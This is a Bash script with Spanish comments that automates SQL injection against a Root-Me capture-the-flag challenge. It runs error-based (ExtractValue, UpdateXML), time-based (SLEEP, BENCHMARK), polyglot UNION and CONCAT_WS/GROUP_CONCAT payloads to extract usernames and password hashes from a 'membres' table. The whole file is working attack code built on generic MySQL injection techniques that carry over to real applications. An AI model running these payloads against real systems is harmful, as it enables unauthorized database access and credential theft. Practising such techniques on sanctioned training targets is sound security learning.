#!/bin/bash

# ================================================
# TÉCNICAS AVANZADAS DE SQL INJECTION
# ================================================

URL="http://challenge01.root-me.org/web-serveur/ch30/"
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  TÉCNICAS AVANZADAS - CH30${NC}"
echo -e "${BLUE}========================================${NC}"

# ============================================
# 1. ERROR-BASED (ExtractValue)
# ============================================

echo -e "\n${YELLOW}[+] 1. Error-Based con ExtractValue${NC}"
curl -s "$URL?action=membres&id=1' AND extractvalue(1,concat(0x7e,(SELECT pass FROM membres WHERE username='admin'),0x7e))#" \
    | grep -E "XPATH|error|syntax|MySQL" -A 2 -B 2

# ============================================
# 2. ERROR-BASED (UpdateXML)
# ============================================

echo -e "\n${YELLOW}[+] 2. Error-Based con UpdateXML${NC}"
curl -s "$URL?action=membres&id=1' AND updatexml(1,concat(0x7e,(SELECT pass FROM membres WHERE username='admin'),0x7e),1)#" \
    | grep -E "XPATH|error|syntax|MySQL" -A 2 -B 2

# ============================================
# 3. TIME-BASED con SLEEP
# ============================================

echo -e "\n${YELLOW}[+] 3. Time-Based con SLEEP${NC}"
echo -e "${BLUE}[!] Midiendo tiempo de respuesta...${NC}"

for char in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
    echo -ne "  Probando '$char'... "
    start=$(date +%s%N)
    curl -s "$URL?action=membres&id=1' AND IF(SUBSTRING(pass,1,1)='$char',SLEEP(3),0)#" > /dev/null
    end=$(date +%s%N)
    diff=$((($end - $start)/1000000000))
    if [ $diff -ge 3 ]; then
        echo -e "${GREEN}✅ Encontrado: $char${NC}"
        break
    else
        echo -e "${RED}❌${NC}"
    fi
done

# ============================================
# 4. Polyglot Payloads
# ============================================

echo -e "\n${YELLOW}[+] 4. Polyglot Payloads${NC}"

payloads=(
    "' AND 1=1 UNION SELECT 1,2,3,4#"
    "'/*!UNION*/ /*!SELECT*/ 1,2,3,4#"
    "' AND '1'='1' UNION SELECT 1,2,3,4#"
    "' OR 1=1/*!UNION SELECT 1,2,3,4*/#"
)

for payload in "${payloads[@]}"; do
    echo -ne "  Probando: $payload... "
    result=$(curl -s "$URL?action=membres&id=1$payload" | grep -c "login failed")
    if [ "$result" -eq 0 ]; then
        echo -e "${GREEN}✅ Posible éxito${NC}"
        echo -e "    ${GREEN}Payload: $payload${NC}"
        break
    else
        echo -e "${RED}❌${NC}"
    fi
done

# ============================================
# 5. Heavy Query con BENCHMARK
# ============================================

echo -e "\n${YELLOW}[+] 5. Heavy Query con BENCHMARK${NC}"
echo -e "${BLUE}[!] Esto puede tardar varios segundos...${NC}"

start=$(date +%s%N)
curl -s "$URL?action=membres&id=1' AND BENCHMARK(10000000,MD5(pass))#" > /dev/null
end=$(date +%s%N)
diff=$((($end - $start)/1000000000))
echo -e "  Tiempo de respuesta: ${diff}s"
if [ $diff -gt 5 ]; then
    echo -e "${GREEN}✅ Inyección basada en tiempo detectada${NC}"
else
    echo -e "${RED}❌ No hay inyección basada en tiempo${NC}"
fi

# ============================================
# 6. Otras técnicas avanzadas
# ============================================

echo -e "\n${YELLOW}[+] 6. Otras técnicas${NC}"

# CONCAT_WS
echo -ne "  CONCAT_WS... "
result6=$(curl -s "$URL?action=membres&id=1' UNION SELECT 1,CONCAT_WS(':',username,pass),3,4 FROM membres#" \
    | grep -v "login failed" | grep -v "Authentification" | grep -v "iframe" | grep -v "Membres" | grep -v "CREATE" | grep -v "strong" | grep -v "form" | grep -v "input" | grep -v "submit" | grep -v "html" | grep -v "header" | grep -v "body" | grep -v "title" | grep -v "link" | grep -v "script" | grep -v "style" | head -5)

if [ -n "$result6" ]; then
    echo -e "${GREEN}✅ Encontrado: $result6${NC}"
else
    echo -e "${RED}❌${NC}"
fi

# GROUP_CONCAT
echo -ne "  GROUP_CONCAT... "
result7=$(curl -s "$URL?action=membres&id=1' UNION SELECT 1,GROUP_CONCAT(pass),3,4 FROM membres#" \
    | grep -v "login failed" | grep -v "Authentification" | grep -v "iframe" | grep -v "Membres" | grep -v "CREATE" | grep -v "strong" | grep -v "form" | grep -v "input" | grep -v "submit" | grep -v "html" | grep -v "header" | grep -v "body" | grep -v "title" | grep -v "link" | grep -v "script" | grep -v "style" | head -5)

if [ -n "$result7" ]; then
    echo -e "${GREEN}✅ Encontrado: $result7${NC}"
else
    echo -e "${RED}❌${NC}"
fi

echo -e "\n${BLUE}========================================${NC}"
echo -e "${BLUE}  FIN${NC}"
echo -e "${BLUE}========================================${NC}"
